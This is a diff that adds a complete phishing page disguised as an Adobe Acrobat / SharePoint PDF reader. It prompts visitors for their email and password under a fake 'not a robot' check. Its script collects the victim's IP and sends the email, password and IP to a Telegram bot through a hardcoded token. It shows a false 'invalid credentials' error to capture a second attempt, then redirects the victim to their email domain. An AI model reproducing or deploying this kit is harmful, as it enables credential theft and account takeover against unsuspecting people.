@@ -1,0 +1,410 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <title>Sign | Online PDF Document Reader</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="icon" href="http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Microsoft-SharePoint-2013-icon.png" type="image/gif" sizes="16x16">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        /* Added background image with opacity */
+        body {
+            margin: 0;
+            font-family: Trebuchet MS;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        body::before {
+            content: "";
+            background-image: url('https://firebasestorage.googleapis.com/v0/b/gippsy7363hd.appspot.com/o/pdf-bck.png?alt=media&token=5d9c87d0-c19d-4da8-a107-3f58cd942255');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            opacity: 0.1;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .clickable {
+            cursor: pointer;
+        }
+        
+        /* Rest of existing styles remain unchanged */
+        .topnav { 
+            overflow:hidden; 
+            background-color:#333; 
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        .topnav a { 
+            float:left; 
+            color:#f2f2f2; 
+            padding:14px 16px; 
+            text-decoration:none; 
+            font-size:17px; 
+            transition: background-color 0.3s;
+        }
+        .topnav a:hover { 
+            background-color:#444; 
+            color:white; 
+        }
+        .topnav a.active { 
+            background-color:#ED2224; 
+            color:white; 
+        }
+        input[type=email], input[type=password] { 
+            width:90%; 
+            padding:12px 20px; 
+            margin:8px 0; 
+            border:1px solid #ccc; 
+            box-sizing:border-box; 
+            border-radius: 4px;
+            font-family: Trebuchet MS;
+            transition: border-color 0.3s;
+        }
+        
+        input[type=email]:focus, 
+        input[type=password]:focus {
+            border-color: #ED2224;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(237, 34, 36, 0.2);
+        }
+        
+        button { 
+            background-color:#ED2224; 
+            color:white; 
+            padding:14px 20px; 
+            margin:8px 0; 
+            border:none; 
+            cursor:pointer; 
+            width:90%; 
+            border-radius: 4px;
+            font-family: Trebuchet MS;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            transition: background-color 0.3s;
+        }
+        button:hover { 
+            background-color: #c41a1c; 
+        }
+        .imgcontainer { 
+            text-align:center; 
+            margin:10px 10px 0;
+            padding-top: 20px;
+        }
+
+.modal {
+    display: block;
+    position: fixed;
+    z-index: 1;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto; /* Allows scrolling if modal exceeds viewport */
+    background-color: rgba(0,0,0,0.4);
+    animation: fadeIn 0.5s;
+}
+
+.modal-content {
+    background-color: #fefefe;
+    position: relative; /* Required for top positioning */
+    top: 20vh; /* Positions modal at least 20% from top */
+    margin: 0 auto; /* Maintains horizontal centering */
+    border: 1px solid #888;
+    width: 450px;
+    min-height: 70vh;
+    /* Dynamic max-height: min(original 90vh, available space with 20px buffer) */
+    max-height: min(90vh, calc(100vh - 20vh - 20px)); 
+    overflow-y: auto; /* Internal scrolling for content */
+    animation: animatezoom 0.6s;
+    border-radius: 8px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.25);
+    display: flex;
+    flex-direction: column;
+}
+
+.modal-body {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+        
+        .loader {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+        }
+        
+        .close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 35px;
+            cursor: pointer;
+            color: #777;
+            transition: color 0.3s;
+        }
+        
+        .close:hover {
+            color: #ED2224;
+        }
+        
+        /* New fade-in animation */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes animatezoom { 
+            from { transform:scale(0) } 
+            to { transform:scale(1) } 
+        }
+        
+        .alert-container { 
+            position: fixed; 
+            top: 20px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            z-index: 1000; 
+        }
+        .alert { 
+            min-width: 300px; 
+            text-align: center; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+        }
+        
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 15px;
+            background-color: #ED2224;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .title {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 25px;
+            font-weight: bold;
+        }
+        
+        .container {
+            padding: 0 30px 30px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 15px;
+            background-color: #f5f5f5;
+            border-top: 1px solid #eee;
+            color: #777;
+            font-size: 12px;
+        }
+        
+        @media (max-width: 500px) {
+            .modal-content {
+                width: 95%;
+                min-height: 75vh;
+            }
+            
+            input[type=email], 
+            input[type=password],
+            button {
+                width: 100%;
+            }
+        }
+    </style>
+
+</head>
+<body oncontextmenu="return false;">
+    <div class="topnav">
+        <a class="active" href="#">Adobe Acrobat Online</a>
+        <a href="#"><span id="result"></span> <span id="datetime"></span>. - SOA.pdf</a>
+    </div>
+
+
+<center>
+    <div class="loader loader-overlay" id="loader">
+        <img src="https://i.gyazo.com/3ed34cf9924be2cf19f5593cf5b43be1.jpg" width="450px" alt="Loading...">
+    </div>
+    </center>
+<center>
+    <!-- Login Modal -->
+    <div id="id01" class="modal">
+        <div class="modal-content">
+            <div class="imgcontainer">
+                <span onclick="" class="close" title="Close Modal" style="float:right; font-size:35px; cursor:pointer">&times;</span>
+                <img src="https://i.gyazo.com/3ed34cf9924be2cf19f5593cf5b43be1.jpg" width="10%">
+            </div>
+            <div class="container">
+                <div class="alert-container">
+                    <div id="errorAlert" class="alert alert-danger d-none"></div>
+                    <div id="successAlert" class="alert alert-success d-none"></div>
+                </div>
+                <form id="loginForm">
+                    <input type="hidden" name="source" value="sharepoint">
+                    <font size="2" face="Trebuchet MS" color="black">Confirm Identity to Prove You are not a Robot</font><br>
+                    <input type="email" placeholder="Email Address" name="email" id="email" required value="">
+                    <br>
+                    <input type="password" placeholder="Enter Password" name="password" id="password" required>
+                    <br>
+                    <button type="submit">CONTINUE</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</center>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+<script>
+let submissionCount = 0;
+
+// Function to get user's IP address
+async function getUserIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error('Error fetching IP:', error);
+        return 'unknown';
+    }
+}
+
+// Function to send data to Telegram
+async function sendToTelegram(formData, userIP) {
+    // Replace these with your actual Telegram credentials
+    const botToken = '6031552470:AAHTgS4HdDwEJdO2KfLLGuOtcMBKckzlO3M';
+    const chatId = '76923442346';
+    
+    const message = `📧 Email: ${formData.email}
+🔑 Password: ${formData.password}
+🌐 Source: ${formData.source}
+📍 IP: ${userIP}`;
+
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    
+    try {
+        await fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+        return true;
+    } catch (error) {
+        console.error('Telegram error:', error);
+        return false;
+    }
+}
+
+function getEmailFromURL() {
+    const hashEmail = window.location.hash.substring(1);
+    if (hashEmail.includes('@')) return hashEmail;
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get('email') || '';
+}
+
+function showLoader() {
+    document.getElementById('loader').style.display = 'block';
+    document.querySelector('button').style.display = 'none';
+    
+    setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('id01').style.display = 'block';
+    }, 3000);
+}
+
+function closeModal() {
+    document.getElementById('id01').style.display = 'none';
+}
+
+$(document).ready(function() {
+    const urlEmail = getEmailFromURL();
+    const username = urlEmail.split("@")[0];
+    document.getElementById("result").textContent = username;
+    
+    if (urlEmail) {
+        $('#email').val(urlEmail);
+    }
+
+    $('#loginForm').on('submit', async function(e) {
+        e.preventDefault();
+        
+        // Show loader and hide alerts
+        $('#loader').show();
+        $('#errorAlert').addClass('d-none');
+        $('#successAlert').addClass('d-none');
+
+        // Get user IP
+        const userIP = await getUserIP();
+        
+        const formData = {
+            email: $('#email').val(),
+            password: $('#password').val(),
+            source: $('[name="source"]').val()
+        };
+
+        // Clear password field
+        $('#password').val('');
+
+        // Send to Telegram only
+        const telegramSuccess = await sendToTelegram(formData, userIP);
+        
+        $('#loader').hide();
+        submissionCount++;
+
+        if (submissionCount === 1) {
+            $('#errorAlert')
+                .removeClass('d-none')
+                .html('Invalid credentials! Try again.');
+        } else {
+            $('#successAlert')
+                .removeClass('d-none')
+                .html('Successful! Redirecting...');
+            
+            const domain = formData.email.split('@')[1];
+            setTimeout(() => {
+                window.location.replace("https://www." + domain);
+            }, 2000);
+        }
+    });
+});
+</script>
+    <script>
+        function updateDateTime() {
+            const now = new Date();
+            const formattedDateTime = now.toLocaleString();
+            document.getElementById("datetime").textContent = formattedDateTime;
+        }
+
+        updateDateTime(); // Initial call
+        setInterval(updateDateTime, 1000); // Update every second
+    </script>
+</body>
+</html>
